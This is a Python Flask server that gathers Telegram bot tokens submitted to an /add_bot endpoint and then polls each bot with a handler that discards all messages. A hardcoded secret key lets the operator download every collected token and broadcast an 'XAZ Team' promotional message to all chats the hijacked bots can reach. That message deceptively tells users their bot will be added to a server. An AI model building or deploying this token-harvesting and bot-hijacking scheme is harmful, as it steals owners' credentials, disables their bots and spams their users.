from flask import Flask, request, jsonify
import telebot
import threading
import requests

app = Flask(__name__)

# تخزين البوتات مع قفل لمنع التعارض بين الخيوط
bots = {}
bots_lock = threading.Lock()

# مفتاح سري لاستعادة التوكنات
SECRET_KEY = "xazow9wowgowwy29wi282r30wyw0wuoewgwowfepwpwy19192828827297282738383eueo"

# دالة للتحقق من صحة التوكن
def is_valid_token(token):
    try:
        url = f"https://api.telegram.org/bot{token}/getMe"
        response = requests.get(url, timeout=5)
        return response.status_code == 200 and response.json().get("ok", False)
    except requests.RequestException as e:
        print(f"Error validating token: {e}")
        return False

# دالة لبدء تشغيل البوت
def start_bot(token):
    bot_instance = telebot.TeleBot(token)

    @bot_instance.message_handler(func=lambda message: True)
    def handle_message(message):
        pass  # تجاهل جميع الرسائل

    try:
        bot_instance.polling(none_stop=True, skip_pending=True)
    except Exception as e:
        print(f"Error in bot {token}: {e}")

# API لإضافة بوت جديد
@app.route('/add_bot', methods=['POST'])
def add_bot():
    data = request.json
    token = data.get('token')

    if not token:
        return jsonify({'error': 'Token is required'}), 400

    if not is_valid_token(token):
        return jsonify({'error': 'Invalid token'}), 400

    with bots_lock:
        if token in bots:
            return jsonify({'error': 'Bot already running'}), 400
        
        bots[token] = {'status': 'active'}
        bot_thread = threading.Thread(target=start_bot, args=(token,), daemon=True)
        bot_thread.start()

    return jsonify({'message': 'Bot added successfully', 'token': token})

# API لاستعادة جميع التوكنات باستخدام مفتاح سري
@app.route('/get_tokens', methods=['GET'])
def get_tokens():
    provided_key = request.args.get('key')
    if provided_key != SECRET_KEY:
        return jsonify({'error': 'Unauthorized'}), 401

    with bots_lock:
        return jsonify({'tokens': list(bots.keys())})

# API لإرسال الرسالة إلى جميع البوتات
@app.route('/send_message', methods=['GET'])
def send_message():
    provided_key = request.args.get('key')
    if provided_key != SECRET_KEY:
        return jsonify({'error': 'Unauthorized'}), 401

    message_text = (
        "**تم إرسال طلب للسيرفر، قريبًا سيتم إضافة هذا البوت لسيرفر XAZ، يُرجى الانتظار 🤖**\n\n"
        "**🔹 XAZ Team Official Links 🔹**\n"
        "🌍 **Source Group:** [XAZ Team Source](https://t.me/xazteam)\n"
        "🌍 **New Team Group:** [Join XAZ Team](https://t.me/+nuACUoH_xn05NjE0)\n"
        "🌍 **XAZ Team Official Website:** [Visit Website](https://xaz-team-website.free.bg/)\n\n"
        "**🌍 XAZ Team Official Website 🌍**\n"
        "⚠ **Note:** If the page doesn't load completely, try enabling PC Mode for the best experience.\n"
        "Stay safe and always verify official sources! 💙"
    )

    with bots_lock:
        for token in bots.keys():
            bot_instance = telebot.TeleBot(token)
            try:
                updates = bot_instance.get_updates()
                chat_ids = set(update.message.chat.id for update in updates if update.message)
                for chat_id in chat_ids:
                    bot_instance.send_message(chat_id, message_text, parse_mode='Markdown', disable_web_page_preview=True)
            except Exception as e:
                print(f"Error sending message with bot {token}: {e}")

    return jsonify({'message': 'Message sent to all bots successfully'})

# API لإيقاف جميع البوتات
@app.route('/stop_bots', methods=['POST'])
def stop_bots():
    provided_key = request.json.get('key')
    if provided_key != SECRET_KEY:
        return jsonify({'error': 'Unauthorized'}), 401

    with bots_lock:
        for token in list(bots.keys()):
            try:
                bot_instance = telebot.TeleBot(token)
                bot_instance.stop_polling()
            except Exception as e:
                print(f"Error stopping bot {token}: {e}")

        bots.clear()

    return jsonify({'message': 'All bots stopped successfully'})

# تشغيل سيرفر Flask
if __name__ == '__main__':
    app.run(port=5000, debug=True)
